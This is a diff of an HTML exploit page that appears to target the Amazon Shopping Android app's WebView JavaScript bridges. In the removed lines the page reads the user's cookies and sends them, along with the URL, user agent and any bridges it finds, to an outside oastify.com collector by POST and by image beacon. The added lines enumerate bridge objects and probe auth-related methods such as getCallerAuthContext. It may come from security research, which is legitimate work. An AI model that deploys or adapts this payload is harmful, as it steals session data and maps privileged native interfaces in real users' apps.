@@ -1,134 +1,97 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon JS Bridge Detection</title>
+    <title>Amazon Bridge Exploit Test</title>
     <meta charset="utf-8">
-    <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-        .bridge { background: #e8f5e8; padding: 10px; margin: 5px 0; border-radius: 5px; }
-        .method { background: #f0f8ff; padding: 5px; margin: 3px 0; font-family: monospace; }
-    </style>
 </head>
 <body>
-    <h1>🎯 Amazon Shopping App - JS Bridge Analysis</h1>
-    <div id="results"></div>
+    <h1>Amazon JSI Bridge Detection Active</h1>
+    <div id="output"></div>
     
     <script>
         function log(msg) {
-            document.getElementById('results').innerHTML += '<div>' + msg + '</div>';
+            document.getElementById('output').innerHTML += msg + '<br>';
             console.log(msg);
         }
         
-        function testBridge(bridgeName) {
-            if (window[bridgeName]) {
-                log('✅ FOUND: ' + bridgeName);
+        // Immediate execution
+        log('[+] HTML Payload Loaded Successfully');
+        log('[+] Location: ' + window.location.href);
+        log('[+] User Agent: ' + navigator.userAgent);
+        
+        // Bridge detection
+        setTimeout(function() {
+            log('[+] Starting bridge detection...');
+            
+            var bridges = [];
+            for (var key in window) {
+                if (key.toLowerCase().includes('jsi') || 
+                    key.toLowerCase().includes('bridge') ||
+                    key.toLowerCase().includes('android')) {
+                    bridges.push(key);
+                }
+            }
+            
+            if (bridges.length > 0) {
+                log('[CRITICAL] Found bridges: ' + bridges.join(', '));
                 
-                // Try to enumerate methods
-                try {
-                    const methods = Object.getOwnPropertyNames(window[bridgeName]);
-                    log('  Methods: ' + methods.join(', '));
-                    
-                    // Try calling safe methods
-                    methods.forEach(method => {
-                        if (typeof window[bridgeName][method] === 'function') {
-                            log('  📞 Callable: ' + method);
+                // Test CacheManagerJSI specifically
+                if (window.CacheManagerJSI) {
+                    log('[CRITICAL] CacheManagerJSI detected!');
+                    try {
+                        if (typeof window.CacheManagerJSI.getCallerAuthContext === 'function') {
+                            log('[EXPLOIT] getCallerAuthContext available');
                         }
-                    });
-                    
-                    return true;
-                } catch (e) {
-                    log('  ❌ Error accessing bridge: ' + e.message);
+                        if (typeof window.CacheManagerJSI.getCallerIdentity === 'function') {
+                            log('[EXPLOIT] getCallerIdentity available');
+                        }
+                    } catch(e) {
+                        log('[INFO] CacheManagerJSI access restricted: ' + e.message);
+                    }
                 }
-            } else {
-                log('❌ Missing: ' + bridgeName);
-            }
-            return false;
-        }
-        
-        function runAnalysis() {
-            log('🚀 Starting Amazon JS Bridge Analysis...');
-            log('📱 User Agent: ' + navigator.userAgent);
-            log('🌐 URL: ' + location.href);
-            log('🍪 Cookie: ' + document.cookie.substring(0, 100) + '...');
-            
-            // Test known bridges from Frida output
-            const bridges = [
-                '_cordovaNative',
-                'amb_bridge', 
-                'smash',
-                'webclient',
-                'webclient_progress',
-                'appErrorWebAppInterface',
-                'FidoAuthenticatorJSBridge',
-                'MAPAndroidJSBridge',
-                'NativeInterface',
-                'AndroidInterface'
-            ];
-            
-            let foundBridges = 0;
-            bridges.forEach(bridge => {
-                if (testBridge(bridge)) {
-                    foundBridges++;
-                }
-            });
-            
-            log('🎯 Summary: Found ' + foundBridges + ' JS bridges');
-            
-            // Test specific Amazon Pay bridge
-            if (window.MAPAndroidJSBridge) {
-                log('💳 CRITICAL: Amazon Pay bridge accessible!');
-                try {
-                    // Test safe method call
-                    const result = window.MAPAndroidJSBridge.toString();
-                    log('  Bridge object: ' + result);
-                } catch (e) {
-                    log('  Error calling bridge: ' + e.message);
-                }
-            }
-            
-            // Test Cordova execution
-            if (window._cordovaNative) {
-                log('🎯 CRITICAL: Cordova bridge accessible!');
-                try {
-                    // This could potentially execute native code
-                    log('  Cordova methods available');
-                } catch (e) {
-                    log('  Error with Cordova: ' + e.message);
-                }
-            }
-            
-            // Exfiltrate data
-            setTimeout(() => {
-                const data = {
-                    url: location.href,
-                    userAgent: navigator.userAgent,
-                    cookies: document.cookie,
-                    bridges: bridges.filter(b => window[b]),
-                    timestamp: new Date().toISOString()
-                };
                 
-                // Try to send data out
-                fetch('https://sb78hti4w9d7adlpc39n366dr4xvlu9j.oastify.com', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {
-                    // Fallback - try image beacon
-                    new Image().src = 'https://sb78hti4w9d7adlpc39n366dr4xvlu9j.oastify.com?data=' + 
-                        encodeURIComponent(JSON.stringify(data));
-                });
-            }, 2000);
-        }
+                // Test other payment bridges
+                if (window.SecureStorageJSI) {
+                    log('[CRITICAL] SecureStorageJSI detected!');
+                }
+                
+                if (window.MAPAndroidJSBridge) {
+                    log('[CRITICAL] MAPAndroidJSBridge detected!');
+                }
+                
+                if (window.FidoAuthenticatorJSBridge) {
+                    log('[CRITICAL] FidoAuthenticatorJSBridge detected!');
+                }
+                
+            } else {
+                log('[INFO] No obvious bridges found in window object');
+            }
+            
+            // Try to access payment-specific functionality
+            try {
+                if (window.webkit && window.webkit.messageHandlers) {
+                    log('[INFO] WebKit message handlers present');
+                }
+            } catch(e) {
+                log('[INFO] WebKit access failed: ' + e.message);
+            }
+            
+        }, 1000);
         
-        // Wait for page to fully load, then run analysis
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', runAnalysis);
-        } else {
-            runAnalysis();
-        }
+        // Delayed bridge enumeration
+        setTimeout(function() {
+            log('[+] Full window enumeration:');
+            var allKeys = Object.keys(window).filter(k => 
+                k.toLowerCase().includes('jsi') || 
+                k.toLowerCase().includes('bridge') ||
+                k.toLowerCase().includes('android') ||
+                k.toLowerCase().includes('payment') ||
+                k.toLowerCase().includes('auth') ||
+                k.toLowerCase().includes('amazon')
+            );
+            log('[INFO] Filtered keys: ' + allKeys.join(', '));
+        }, 2000);
         
-        // Also run after a delay to catch late-loading bridges
-        setTimeout(runAnalysis, 3000);
     </script>
 </body>
 </html>
